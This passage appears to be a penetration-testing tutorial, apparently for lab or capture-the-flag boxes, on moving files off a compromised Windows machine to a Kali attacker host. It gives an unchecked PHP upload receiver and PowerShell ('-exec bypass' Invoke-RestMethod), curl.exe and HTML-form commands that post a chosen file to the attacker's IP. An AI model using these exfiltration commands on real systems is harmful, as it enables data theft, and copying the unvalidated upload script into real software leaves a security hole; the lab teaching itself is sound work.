## Kali Box

First, create a PHP script `upload.php` which will handle the uploading part.

<?php  
$target_dir = "uploads/";  
$target_file = $target_dir . basename($_FILES["targetfile"]["name"]);  
move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)  
?>

And for the web server, use `Apache2` which comes with Kali by default.

**# Running Apache2 Server**  
service apache2 start

Then, put the `upload.php` script under the following web directory.

/var/www/html/web/       **# I added 'web' directory for demo purpose**

As you notice it from the `upload.php` script, we also need to create a directory called `uploads` in order to collect uploaded files. Create it under the `/var/www/html/web` directory and configure it with proper ownership as well as write permissions.

**# Creating 'uploads' Directory**  
mkdir /var/www/html/web/uploads**# Configuring Directory Ownership with 'www-data' User**  
chown www-data:www-data /var/www/html/web/uploads**# Configuring Directory with Write Permissions**  
chmod 766 /var/www/html/web/uploads

Once all done, you should have set up your web directory similar to below:

![](https://miro.medium.com/max/30/1*deVtUdbhi73WPac8Tt_kvw.png?q=20)

![](https://miro.medium.com/max/484/1*deVtUdbhi73WPac8Tt_kvw.png)

## Windows Box

It’s simple from the Window box. We can use a sexy PowerShell one-liner using `Invoke-RestMethod` to get the job done.

**# PowerShell**  
powershell -nop -exec bypass Invoke-RestMethod -Uri [http://<_Your Kali IP_>/web/upload.php](http://10.10.14.29/php/upload.php) -Method Post -Infile 'c:\<_Path to the Target File_>'**# Warning: If the 'Invoke' command is globally restricted, this would NOT work.**

Or

If the box is Windows 10 build 17063 or later, we can use even sexier one-liner using `curl.exe`. (Finally, Microsoft began adding “hacker” tools to Windows :P)

**# Curl**  
curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\<_Path to the Target File_>" -X POST -v [http://<_Your Kali IP_>/web/upload.php](http://10.10.14.29/php/upload.php)

Or

If it’s an old Windows box without PowerShell and/or `curl.exe`, we can create the following `html` file to upload a file via browser. (Locate this `html` file in our web root)

**# Upload.html**
```html
<html>  
<head></head>  
<body>  
<form action="[http://<Your Kali IP>/web/upload.php](http://192.168.102.74/upload.php)" method="POST" enctype="multipart/form-data">  
<br><br>  
Choose A File:<br>  
<input type="file" name="targetfile"><br>  
<input type="submit" name="submit" value="upload">  
</form>  
</body>  
</html>
```